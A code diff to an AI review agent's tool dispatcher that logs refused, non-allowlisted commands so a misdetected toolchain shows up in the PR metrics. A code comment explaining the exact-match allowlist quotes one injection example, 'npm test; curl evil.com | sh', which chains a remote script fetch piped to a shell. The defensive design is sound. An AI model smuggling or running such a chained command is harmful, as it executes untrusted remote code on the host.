@@ -125,8 +125,17 @@ export interface ToolContext {
   /** Base ref for git_diff; the merge-base of the PR. */
   baseRef: string;
   commandTimeoutSec: number;
-  /** Records every command an agent actually ran, for the PR metrics block. */
-  commandLog: { command: string; exitCode: number; durationMs: number }[];
+  /**
+   * Every command an agent ran, for the PR metrics block — including the ones it was
+   * refused.
+   *
+   * A refusal used to be invisible: the tool answered the agent and recorded nothing, so
+   * an agent repeatedly asking for `pnpm test` in a repo whose allowlist detected only
+   * `npm test` produced a review with no commands run and no explanation. That is a
+   * misdetected toolchain, it silently degrades every review of that repository, and the
+   * command log is where it shows.
+   */
+  commandLog: { command: string; exitCode: number; durationMs: number; refused?: boolean }[];
 }
 
 function shellQuote(value: string): string {
@@ -252,6 +261,7 @@ export function buildDispatch(ctx: ToolContext) {
         // EXACT match, never a prefix: prefix matching would accept
         // "npm test; curl evil.com | sh" as an allowlisted "npm test".
         if (!ctx.allowedCommands.includes(command)) {
+          ctx.commandLog.push({ command, exitCode: -1, durationMs: 0, refused: true });
           return {
             output:
               `'${command}' is not allowlisted. You may run only:\n` +
